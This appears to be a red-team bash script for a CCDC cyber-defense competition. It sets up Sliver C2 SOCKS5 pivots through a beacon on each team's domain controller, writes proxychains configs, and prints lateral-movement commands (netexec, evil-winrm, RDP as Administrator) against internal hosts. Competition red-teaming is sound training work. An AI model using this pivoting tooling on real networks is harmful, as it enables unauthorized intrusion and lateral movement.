#!/bin/bash
# ================================================
# CCDC Rapid Pivot Switcher (Sliver SOCKS5)
# Usage: ./pivot.sh <team_number> [port]
#   e.g. ./pivot.sh 5          → starts SOCKS on 1085
#   e.g. ./pivot.sh 5 1090     → custom port
#
# For EternalBlue / Meterpreter pivots, use ligo.sh instead.
# This script is for Sliver-based SOCKS5 pivots.
# ================================================

if [[ -z "$1" ]]; then
  echo "Usage: $0 <team> [port]"
  echo "Current active pivots:"
  ss -tlnp | grep -E '108[0-9]' || echo "   None"
  exit 1
fi

TEAM="$1"
PORT="${2:-108${TEAM}}"   # 1085 for team 5, 1084 for team 4, etc.
DOMAIN="aperturesciencelabs.org"

# Check for port conflict (ligo.sh defaults to 109<TEAM>)
if ss -tlnp 2>/dev/null | grep -q ":${PORT} "; then
  echo "[!] WARNING: Port ${PORT} is already in use!"
  echo "    If ligo.sh (Meterpreter) is running, it defaults to port 109${TEAM}."
  echo "    Specify a different port:  $0 ${TEAM} <port>"
  echo ""
  read -rp "    Continue anyway? [y/N] " ans
  [[ "${ans,,}" != "y" ]] && { echo "[-] Aborted."; exit 1; }
fi

echo "[+] ================================================"
echo "[+] Switching to TEAM ${TEAM} pivot (SOCKS5 on 127.0.0.1:${PORT})"
echo "[+] ================================================"

# 1. Tell Sliver to start SOCKS5 on the chosen beacon (you pick the DC beacon once)
echo "[*] In Sliver console, run these two commands now:"
echo "    use <beacon_on_team${TEAM}_DC>     # or sessions -i <ID>"
echo "    socks5 start --bind 0.0.0.0:${PORT}"
echo ""
echo "[+] Once SOCKS5 is running, press ENTER here..."
read -r

# 2. Create per-team proxychains config (super fast switching)
cat > "/tmp/proxychains_team${TEAM}.conf" << EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 ${PORT}
EOF

echo "[+] Created /tmp/proxychains_team${TEAM}.conf"

# Set up aliases that don't conflict with ligo.sh's pc<N>/p<N>
echo ""
echo "[+] NOW USE THESE ALIASES / COMMANDS:"
echo "    alias pp${TEAM}='proxychains4 -f /tmp/proxychains_team${TEAM}.conf'   # sliver pivot"
echo "    alias p${TEAM}='proxychains4 -f /tmp/proxychains_team${TEAM}.conf'    # shorthand"
echo ""
echo "    pp${TEAM} netexec smb 172.16.3.140 -u Administrator -p 'pass' -d ${DOMAIN}"
echo "    pp${TEAM} evil-winrm -i 172.16.1.11 -u Administrator -p 'pass'"
echo "    pp${TEAM} xfreerdp /v:172.16.1.10 /u:Administrator@${DOMAIN} /cert-ignore"
echo ""
echo "[+] NOTE: ligo.sh (Meterpreter) uses SOCKS 109${TEAM} with aliases pc${TEAM}/p${TEAM}"
echo "    This script (Sliver) uses SOCKS ${PORT} with alias pp${TEAM}"
echo "    Both can run simultaneously for the same team."
echo ""
echo "[+] You can now run commands on ANY internal IP for team ${TEAM} instantly."
echo "[+] Open tmux panes for multiple teams at once — zero conflict."
echo "The cake is a lie… but your pivots are instant."